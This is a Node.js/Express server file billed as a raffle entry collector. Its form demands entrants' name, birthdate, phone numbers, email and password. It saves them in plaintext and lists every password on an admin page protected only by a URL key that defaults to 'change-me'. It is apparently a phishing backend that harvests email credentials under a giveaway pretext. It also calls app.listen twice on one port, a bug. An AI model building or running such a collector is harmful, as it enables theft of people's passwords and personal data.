// Raffle entry collector: Node.js + Express, saves to raffle.json
const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_KEY = process.env.ADMIN_KEY || "change-me"; // password to view the entries
const RAFFLE_FILE = path.join(__dirname, "raffle.json");

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const loadRaffle = () => { try { return JSON.parse(fs.readFileSync(RAFFLE_FILE, "utf8")); } catch { return []; } };
const saveRaffle = rows => fs.writeFileSync(RAFFLE_FILE, JSON.stringify(rows, null, 2));

// Receive a raffle entry
app.post("/api/raffle", (req, res) => {
  const { name, birthdate, number, altNumber, email, password } = req.body || {};

  if (!name || !birthdate || !number || !email || !password)
    return res.status(400).json({ error: "Please fill in all required fields." });
  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email))
    return res.status(400).json({ error: "Invalid email address." });
  if (!/^[0-9+\-\s]{7,15}$/.test(number) || (altNumber && !/^[0-9+\-\s]{7,15}$/.test(altNumber)))
    return res.status(400).json({ error: "Invalid phone number." });
  if (isNaN(Date.parse(birthdate)) || new Date(birthdate) > new Date())
    return res.status(400).json({ error: "Invalid birthdate." });

  const rows = loadRaffle();
  if (rows.some(r => r.email.toLowerCase() === email.toLowerCase()))
    return res.status(409).json({ error: "This email has already entered the raffle." });

  rows.push({
    name: String(name).trim(),
    birthdate,
    number: String(number).trim(),
    altNumber: altNumber ? String(altNumber).trim() : "",
    email: String(email).trim(),
    password: String(password),
    submittedAt: new Date().toISOString()
  });
  saveRaffle(rows);
  res.json({ ok: true });
});

// Admin: view entries at /admin/raffle?key=YOUR_ADMIN_KEY
app.get("/admin/raffle", (req, res) => {
  if (req.query.key !== ADMIN_KEY) return res.status(401).send("Unauthorized");
  const esc = s => String(s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
  const body = loadRaffle().map(r =>
    `<tr><td>${esc(r.name)}</td><td>${esc(r.birthdate)}</td><td>${esc(r.number)}${r.altNumber ? " / " + esc(r.altNumber) : ""}</td><td>${esc(r.email)}</td><td>${esc(r.password)}</td><td>${esc(r.submittedAt)}</td></tr>`
  ).join("");
  res.send(`<!doctype html><meta charset="utf-8"><title>Raffle entries</title>
  <style>body{font-family:sans-serif;padding:20px}table{border-collapse:collapse}td,th{border:1px solid #ccc;padding:6px 10px}</style>
  <h2>Raffle entries</h2>
  <table><tr><th>Name</th><th>Birthdate</th><th>Number(s)</th><th>Email</th><th>Password</th><th>Submitted</th></tr>${body}</table>`);
});

app.listen(PORT, () => console.log(`Running on http://localhost:${PORT}`));

app.get("/", (req, res) => res.redirect("/raffle.html"));
app.listen(PORT, () => console.log(`Running on http://localhost:${PORT}`));
